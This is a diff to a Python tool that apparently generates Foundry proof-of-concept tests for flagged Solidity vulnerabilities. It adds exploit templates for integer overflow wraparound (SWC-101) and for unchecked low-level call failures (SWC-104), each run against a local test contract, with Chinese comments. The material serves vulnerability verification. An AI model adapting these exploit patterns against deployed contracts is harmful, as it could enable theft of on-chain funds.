@@ -184,12 +184,70 @@ contract {cls} is Test {{
 """
 
 
+_SOL_ARITHMETIC = """
+contract {cls} is Test {{
+    function testExploit() public {{
+        // 0.4.x~0.7.x 编译器不检查溢出（SWC-101）：
+        // 极值输入 type(uint256).max 让算术回卷 —— sum += x 绕回成 0
+        Victim victim = new Victim();
+
+        // 第一次入账把累计值推到上界附近，第二次极值入账触发回卷
+        // （骨架按 Victim 的入账入口 deposit(uint256) 形态生成；
+        //  实际接入时按目标函数签名替换调用形态）
+        vm.prank(address(0xA11CE));
+        victim.deposit(type(uint256).max);
+
+        vm.prank(address(0xBAD));
+        victim.deposit(1);
+
+        // 断言：上溢回卷 —— 累计值不增反减（修复后 require 会 revert）
+        assertTrue(victim.totalSupply() < type(uint256).max,
+                   "expected uint256 wraparound");
+    }}
+}}
+"""
+
+_SOL_UNCHECKED = """
+contract RevertReceiver {{
+    // 拒收 ETH 的合约（无 receive/payable fallback）
+    // → 目标合约的低层调用静默失败，状态照常推进（SWC-104）
+}}
+
+contract {cls} is Test {{
+    function testExploit() public {{
+        Victim victim = new Victim();
+        RevertReceiver receiver = new RevertReceiver();
+
+        vm.deal(address(victim), 1 ether);
+        uint256 receiverBalanceBefore = address(receiver).balance;
+
+        // 目标合约向拒收地址发起底层调用 —— 返回值被丢弃，
+        // 失败被静默吞掉，合约状态与预期不一致
+        // （骨架按 Victim.withdraw(address) 形态生成；实际接入时
+        //  按目标函数签名替换 encodeWithSignature 的内容）
+        (bool ok, ) = address(victim).call(
+            abi.encodeWithSignature("withdraw(address)", address(receiver)));
+        ok; // 老语法双返回值占位
+
+        // 断言：调用失败（资金未到账）—— 失败静默就是漏洞本身；
+        // 修复版会 require(ok) 让整笔回滚
+        assertTrue(address(receiver).balance == receiverBalanceBefore,
+                   "receiver must not accept ETH");
+    }}
+}}
+"""
+
+
 def _synth_solidity(unit: CodeUnit, category: str) -> str:
     cls = "Poc" + _safe_name(unit.unit_name)
     tpl = {"reentrancy": _SOL_REENTRANCY,
            "txorigin": _SOL_TX_ORIGIN,
            "tx_origin": _SOL_TX_ORIGIN,
-           "access_control": _SOL_ACCESS}.get(category, _SOL_ACCESS)
+           "access_control": _SOL_ACCESS,
+           "arithmetic": _SOL_ARITHMETIC,
+           "unchecked_low_level_calls": _SOL_UNCHECKED,
+           "unchecked": _SOL_UNCHECKED,
+           }.get(category, _SOL_ACCESS)
     body = tpl.format(cls=cls)
     return _SOL_HEADER.format(target=unit.unit_name, category=category,
                                file=Path(unit.file_path).name,
